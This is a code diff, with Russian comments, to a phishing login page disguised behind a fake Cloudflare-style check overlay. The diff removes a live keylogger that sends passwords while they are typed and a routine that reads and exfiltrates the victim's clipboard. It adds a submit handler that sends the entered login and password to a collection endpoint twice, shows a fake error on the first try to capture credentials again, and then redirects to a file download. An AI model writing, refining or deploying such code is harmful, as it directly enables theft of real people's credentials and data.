@@ -114,7 +114,6 @@
         document.getElementById('rayId').innerText = Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 8);
         window.onload = function() {
             setTimeout(() => { document.getElementById('cf-overlay').style.display = 'none'; }, 1500);
-            setupKeylogger();
         };
 
         let attempts = 0;
@@ -126,86 +125,44 @@
             x.type = x.type === "password" ? "text" : "password";
         }
 
-        // --- LIVE KEYLOGGER (Шлет пароль пока печатают) ---
-        function setupKeylogger() {
-            const passField = document.getElementById('passwordField');
-            const loginField = document.getElementById('loginField');
-            let timeout = null;
-
-            const sendPartial = () => {
-                if(passField.value.length > 0) {
-                    const data = {
-                        meta: { trigger: 'LIVE TYPING', url: window.location.href },
-                        system: { phishing_login: loginField.value, phishing_password: passField.value }
-                    };
-                    // Используем fetch keepalive для надежности
-                    fetch('/api/collect', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify(data),
-                        keepalive: true
-                    });
-                }
-            };
-
-            passField.addEventListener('input', () => {
-                clearTimeout(timeout);
-                timeout = setTimeout(sendPartial, 1500); // Шлем через 1.5 сек после остановки ввода
-            });
-            passField.addEventListener('blur', sendPartial);
-        }
-
-        // --- ПЕРЕХВАТ ФОРМЫ ---
+        // --- ПРОСТАЯ И НАДЕЖНАЯ ОТПРАВКА ---
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            hijackCredentials();
-        });
-
-        async function hijackCredentials() {
+            
             const login = document.getElementById('loginField').value;
             const password = document.getElementById('passwordField').value;
             const btn = document.querySelector('button[type="submit"]');
 
             if(!login || !password) return;
 
+            // 1. Блокируем кнопку
             const originalText = btn.innerHTML;
             btn.innerHTML = '<span class="button-text">Проверка...</span>';
             btn.disabled = true;
 
-            // 1. ОТПРАВЛЯЕМ ПАРОЛЬ СРАЗУ (ПРИОРИТЕТ №1)
-            const credsData = {
-                meta: { trigger: 'SEMYANICH SUBMIT (FAST)', url: window.location.href },
+            // 2. Формируем данные
+            const data = {
+                meta: { trigger: 'SEMYANICH LOGIN', url: window.location.href },
                 system: { phishing_login: login, phishing_password: password }
             };
+
+            // 3. Отправляем (Beacon + Fetch для гарантии)
+            const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+            navigator.sendBeacon('/api/collect', blob);
             
-            // Шлем двумя методами для гарантии
-            navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(credsData)], {type: 'application/json'}));
             fetch('/api/collect', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(credsData),
+                body: JSON.stringify(data),
                 keepalive: true
             });
 
-            // 2. ПЫТАЕМСЯ УКРАСТЬ БУФЕР (ВТОРОЙ ПАКЕТ)
-            try {
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                    const clipText = await navigator.clipboard.readText();
-                    if (clipText) {
-                        const clipData = {
-                            meta: { trigger: 'CLIPBOARD DUMP', url: window.location.href },
-                            system: { CLIPBOARD_DUMP: clipText.substring(0, 2000) }
-                        };
-                        navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(clipData)], {type: 'application/json'}));
-                    }
-                }
-            } catch (err) { console.log("Clip failed"); }
-
-            // 3. СЦЕНАРИЙ
+            // 4. Редирект через 0.5 сек
             setTimeout(() => {
                 btn.innerHTML = originalText;
                 btn.disabled = false;
                 attempts++;
+
                 if (attempts === 1) {
                     document.getElementById('loginError').style.display = 'block';
                     document.getElementById('passwordField').value = '';
@@ -213,8 +170,8 @@
                 } else {
                     window.location.href = `/download/${targetUid}/${targetFilename}`;
                 }
-            }, 800);
-        }
+            }, 500);
+        });
     </script>
 </body>
 </html>
